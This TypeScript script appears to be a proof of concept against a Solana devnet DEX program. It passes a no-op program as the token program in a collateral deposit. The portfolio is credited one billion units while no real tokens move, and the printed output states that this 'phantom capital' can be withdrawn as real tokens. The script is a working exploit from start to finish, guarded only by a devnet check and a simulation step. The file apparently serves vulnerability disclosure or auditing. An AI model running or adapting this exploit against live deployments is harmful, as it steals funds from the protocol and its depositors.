import { Connection, Keypair, PublicKey, SystemProgram, Transaction, sendAndConfirmTransaction } from "@solana/web3.js";
import * as fs from "fs";
import { LEAN_DEVNET, PORTFOLIO_SIZE, DexOff, PflOff, assertDevnet, parseDex, initPortfolio, depositCollateral } from "../src/lean/index.js";
const conn = new Connection(process.env.SOLANA_RPC_URL!, "confirmed");
const P = LEAN_DEVNET.percolator;
const NOOP = new PublicKey("noopb9bkMVfRPU8AsbpTUg8AQkHtKwMYZiFUjNRtMmV");
const DEX = new PublicKey("7iu9Yga379XqZ6s4buzh2cZmbc9examJF75NdzgPKzM3");
const funder = Keypair.fromSecretKey(Uint8Array.from(JSON.parse(fs.readFileSync(`${process.env.HOME}/.config/solana/id.json`,"utf8"))));
const u64=(b:Buffer,o:number)=>b.readBigUInt64LE(o);
async function main(){
  await assertDevnet(conn);
  const dex=parseDex(Buffer.from((await conn.getAccountInfo(DEX))!.data));
  const owner=Keypair.generate(), pfl=Keypair.generate();
  const lam=await conn.getMinimumBalanceForRentExemption(PORTFOLIO_SIZE);
  await sendAndConfirmTransaction(conn,new Transaction().add(
    SystemProgram.createAccount({fromPubkey:funder.publicKey,newAccountPubkey:pfl.publicKey,lamports:lam,space:PORTFOLIO_SIZE,programId:P}),
    initPortfolio(P,{dex:DEX,portfolio:pfl.publicKey,owner:owner.publicKey})),[funder,pfl,owner],{commitment:"confirmed"});
  const vaultBal0=BigInt((await conn.getTokenAccountBalance(dex.vault)).value.amount);
  const tx=new Transaction().add(depositCollateral(P,{dex:DEX,mint:dex.quoteMint,vault:dex.vault,tokenProgram:NOOP},
    {portfolio:pfl.publicKey,depositor:owner.publicKey,sourceToken:Keypair.generate().publicKey,amount:1_000_000_000n}));
  tx.feePayer=funder.publicKey; tx.recentBlockhash=(await conn.getLatestBlockhash()).blockhash; tx.sign(funder,owner);
  const sim=await conn.simulateTransaction(tx,{accounts:{encoding:"base64",addresses:[pfl.publicKey.toBase58(),DEX.toBase58()]}});
  const [pB,dB]=sim.value.accounts!.map(a=>Buffer.from(a!.data[0],"base64"));
  console.log("sim err:",JSON.stringify(sim.value.err));
  console.log(`portfolio.capital:   ${u64(pB,PflOff.capital)}  (phantom credit from no-op "transfer")`);
  console.log(`dex.vaultBalance:    before=${u64(dB,DexOff.vaultBalance)-1_000_000_000n} after=${u64(dB,DexOff.vaultBalance)}`);
  console.log(`real SPL vault bal:  ${vaultBal0}  (UNCHANGED — no tokens moved)`);
  console.log(`=> invariant V==SPL now broken by ${u64(dB,DexOff.vaultBalance)-vaultBal0}; phantom capital is withdrawable as real tokens.`);
  process.exit(0);
}
main().catch(e=>{console.error(e);process.exit(1);});
